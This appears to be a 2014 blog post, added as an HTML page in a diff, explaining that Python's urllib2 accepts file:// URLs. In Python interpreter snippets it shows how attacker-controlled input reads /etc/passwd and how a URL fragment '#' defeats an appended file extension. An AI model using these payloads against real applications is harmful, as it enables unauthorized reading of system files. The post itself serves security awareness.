@@ -1,0 +1,161 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Über Dig, Do the impossible">
+
+        <link rel="alternate"  href="http://www.levigross.com/feeds/all.atom.xml" type="application/atom+xml" title="Über Dig Full Atom Feed"/>
+
+        <title>Security Concerns With Python’s urllib and urllib2 // Über Dig // Do the impossible</title>
+
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.3.0/pure-min.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.0.3/css/font-awesome.min.css">
+    <link rel="stylesheet" href="http://www.levigross.com/theme/css/pure.css">
+    <link rel="stylesheet" href="http://www.levigross.com/theme/css/pygments.css">
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/fitvids/1.0.1/jquery.fitvids.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $(".content").fitVids();
+        });
+    </script>
+</head>
+
+<body>
+<div class="pure-g-r" id="layout">
+    <div class="sidebar sidebar-article pure-u">
+        <header class="header-article">
+            <hgroup>
+                <a href="http://www.levigross.com/" title="See posts by Levi Gross">
+                    <img class="article-avatar" alt="Levi Gross" src="http://www.gravatar.com/avatar/08a35b1a9fbd56f9c24a3482c67ff031">
+                </a>
+                <h2 class="article-info">Levi Gross</h2>
+                <small class="about-author">Human living in NYC</small>
+                <h5>Published</h5>
+                <p>Fri 04 July 2014</p>
+                <a href="/">&larr;Home</a>
+            </hgroup>
+        </header>
+    </div>
+    <div class="pure-u">
+        <div class="content">
+            <section class="post">
+                <header class="post-header">
+                    <h1>Security Concerns With Python&#8217;s urllib and&nbsp;urllib2</h1>
+                        <p class="post-meta">
+<!--                             // under  -->
+                        </p>
+                </header>
+            </section>
+            <p>Applications written in Python should not use <code>urllib</code> and <code>urllib2</code> for the following&nbsp;reasons.</p>
+<ol>
+<li>External proxy support isn&#8217;t trivial to implement, which usually means it isn&#8217;t implemented at&nbsp;all.</li>
+<li>The urlopen functionality does not implement <span class="caps">ANY</span> <span class="caps">SSL</span>&nbsp;verification.</li>
+<li>Many types of <span class="caps">URL</span>&#8217;s are supported, including&nbsp;file://.</li>
+</ol>
+<p>For now lets focus on number&nbsp;3.</p>
+<p>It is commonly exploited with the following&nbsp;code:</p>
+<div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">urllib2</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">attacker_controlled_input</span> <span class="o">=</span> <span class="s">&quot;file:///etc/passwd&quot;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">attacker_controlled_input</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</pre></div>
+
+
+<p>If you control attacker_controlled_input, you have as much control as if you had an <span class="caps">XML</span> <span class="caps">XXE</span> attack (arbitrary file read, DoS by read /dev/zero&nbsp;etc..).</p>
+<p>However, it is really important that you control the first part of the input. Without it, you would not be able to exploit this&nbsp;functionality.</p>
+<p>Now, say you control the first part of the input but something is being appended to that input&nbsp;e.g:</p>
+<div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">urllib2</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">attacker_controlled_data</span> <span class="o">=</span> <span class="s">&quot;file:///etc/passwd&quot;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">ext</span> <span class="o">=</span> <span class="s">&quot;.csv&quot;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">attacker_controlled_data</span> <span class="o">+</span> <span class="n">ext</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</pre></div>
+
+
+<p>You are stuck! While you would be able to read any .csv file on the system your lofty goal of /etc/passwd is not&nbsp;obtainable!</p>
+<p>You may be tempted to insert a <span class="caps">NUL</span> byte at the end of your input.&nbsp;e.g</p>
+<div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">urllib2</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">attacker_controlled_data</span> <span class="o">=</span> <span class="s">&quot;file:///etc/passwd%00&quot;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">ext</span> <span class="o">=</span> <span class="s">&quot;.csv&quot;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">attacker_controlled_data</span> <span class="o">+</span> <span class="n">ext</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</pre></div>
+
+
+<p>But Python does not let you open files with strings that have <span class="caps">NUL</span> bytes in them. It will throw the following&nbsp;exception.</p>
+<div class="highlight"><pre><span class="ne">TypeError</span><span class="p">:</span> <span class="n">must</span> <span class="n">be</span> <span class="n">encoded</span> <span class="n">string</span> <span class="n">without</span> <span class="n"><span class="caps">NULL</span></span> <span class="nb">bytes</span><span class="p">,</span> <span class="ow">not</span> <span class="nb">str</span>
+</pre></div>
+
+
+<p>Fear not! There is still hope. Lets take a step back and remember we are exploiting a <span class="caps">URL</span>&nbsp;library.</p>
+<p><span class="caps">URL</span> libraries have to handle all types of URLs. While I will not go into an in-depth explanation of on <span class="caps">URL</span> construction. I will focus on one part, the <span class="caps">URL</span> fragment. A <span class="caps">URL</span> fragment is generally used by a browser to scroll to a specific location on the page (for more details please see the following Wikipedia article&nbsp;http://en.wikipedia.org/wiki/Fragment_identifier).</p>
+<p>However, they mean nothing to any <span class="caps">URL</span> fetching&nbsp;library.</p>
+<p>Making use of this knowledge, we can craft our payload to look like&nbsp;this:</p>
+<div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">urllib2</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">attacker_controlled_data</span> <span class="o">=</span> <span class="s">&quot;file:///etc/passwd#&quot;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">ext</span> <span class="o">=</span> <span class="s">&quot;.csv&quot;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">attacker_controlled_data</span> <span class="o">+</span> <span class="n">ext</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</pre></div>
+
+
+<p>And obtain the contents of <code>/etc/passwd</code>.</p>
+<p>It is important to note that the above mentioned workaround doesn&#8217;t work with <code>urllib</code>, it only works with <code>urllib2</code>.</p>
+<p>Have a good day and a wonderful independence&nbsp;day!</p>
+            <div class="hr"></div>
+            <a href="#" class="go-top">Return to the top of the page</a>
+<div class="comments">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = "levigross"; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div><footer class="footer">
+    <p>&copy; Über Dig</p>
+</footer>        </div>
+    </div>
+</div>
+    <script>
+        var $top = $('.go-top');
+
+        // Show or hide the sticky footer button
+        $(window).scroll(function() {
+            if ($(this).scrollTop() > 200) {
+                $top.fadeIn(200);
+            } else {
+                $top.fadeOut(200);
+            }
+        });
+
+        // Animate the scroll to top
+        $top.click(function(event) {
+            event.preventDefault();
+            $('html, body').animate({scrollTop: 0}, 300);
+        })
+
+        // Makes sure that the href="#" attached to the <a> elements
+        // don't scroll you back up the page.
+        $('body').on('click', 'a[href="#"]', function(event) {
+            event.preventDefault();
+        });
+    </script>
+    <script type="text/javascript">
+        var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+        document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+    <script type="text/javascript">
+        try {
+            var pageTracker = _gat._getTracker("UA-19381157-1");
+            pageTracker._trackPageview();
+            } catch(err) {}
+    </script>
+</body>
+</html>
